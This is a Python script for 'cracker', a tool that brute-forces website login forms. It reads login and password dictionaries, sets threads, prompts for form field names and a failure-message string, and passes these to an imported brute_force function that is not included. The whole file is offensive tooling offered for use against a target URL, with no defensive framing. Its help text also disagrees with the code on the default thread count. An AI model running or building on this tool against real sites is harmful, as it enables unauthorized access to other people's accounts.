#! /usr/bin/python3

### TODO ###
# * add colored output
# * add tqdm
# * fix BrokenPipeError (timeout)
### END TODO ###


### IMPORT MODULES ###
from bruteforce import brute_force
from bruteforce import TargetObj
import argparse
### END MODULES ###






# ================================= MAIN FUNCTION =========================== #
def main(args):
	# get args' values #
	logins, passwords = [], []
	login = args['l']
	login_dict_path = args['L']
	password = args['p']
	password_dict_path = args['P']
	num_threads = 1
	url = args['target']
	reverse = args['reverse']


	# set brute force login(s) #
	if login_dict_path:
		login_dict = open(login_dict_path, 'r')
		logins = [login.replace('\n', '') for login in login_dict]
	elif login:
		logins.append(login)

	# set brute force password(s) #
	if password_dict_path:
		password_dict = open(password_dict_path, 'r')
		passwords = [passwd.replace('\n', '') for passwd in password_dict]
	elif password:
		passwords.append(password)

	# specify number of threads to use #
	if 't' in args:
		num_threads = args['t']


	print('Starting brute force attack.')
	# generating TargetObj class variables with user input #
	get_target_info()
	TargetObj.url = url

	# brute force attack #
	brute_force(logins, passwords, num_threads, reverse)









# =============================== USER INPUT ================================ #

def ask_failure_sign():
	"""
	 Function asks user to set failure sign.
	 failure_sign is string that is stored in html code of page
	 if auth request was unsuccessful.
	 e.g. "Failed login attempt.", "Error. Try again.", etc.
	"""
	return input('Set failure sign (look help for more info): ')

def ask_login_var():
	login_var = input('Login variable: ')
	return login_var

def ask_password_var():
	pass_var = input('Password variable: ')
	return pass_var

def ask_login_button():
	login_button_text = input('Login button text:');
	return login_button_text

def get_target_info():
	"""
	Get information about attack target:
		* login varaible name,
		* password variable name,
		* failure sign.
	And set TargetObj static variables with provided values.
	"""
	TargetObj.login_var = ask_login_var()
	TargetObj.pass_var = ask_password_var()
	TargetObj.failure_sign = ask_failure_sign()
	TargetObj.button_text = ask_login_button()



# ================================ DEFINE ARGS =============================== #
def define_args():
	parser = argparse.ArgumentParser(prog = 'cracker')

	login_group = parser.add_mutually_exclusive_group(required = True)
	define_login_group(login_group)
	password_group = parser.add_mutually_exclusive_group(required = True)
	define_password_group(password_group)

	parser.add_argument('-t'
                            , metavar = 'THREADS'
                            , type = int
                            , default = 1
                            , help = 'set number of threads to use (default: 3)')

	parser.add_argument('target'
                            , help = 'set target website (specify login action)' \
                             ' e.g. https://target.com/login.php')

	parser.add_argument('--reverse'
                            , '-r'
                            , action = 'store_true'
                            , help = 'set brute force attack type')
	return parser


def define_login_group(login_group):
		login_group.add_argument('-l'
                                         , metavar = 'LOGIN'
                                         , help = 'set attack login')

		login_group.add_argument('-L'
                                         , metavar = 'dict.txt'
                                         , help = 'set login dictionary')


def define_password_group(password_group):
		password_group.add_argument('-p'
                                            , metavar = 'PASSWORD'
                                            , help = 'set attack password')

		password_group.add_argument('-P'
                                            , metavar = 'dict.txt'
                                            , help = 'set password dictionary')




### START PROGRAM ###
if __name__ == "__main__":
	parser = define_args()
	args = vars(parser.parse_args())
	main(args)
### PROGRAM FINISHED ###
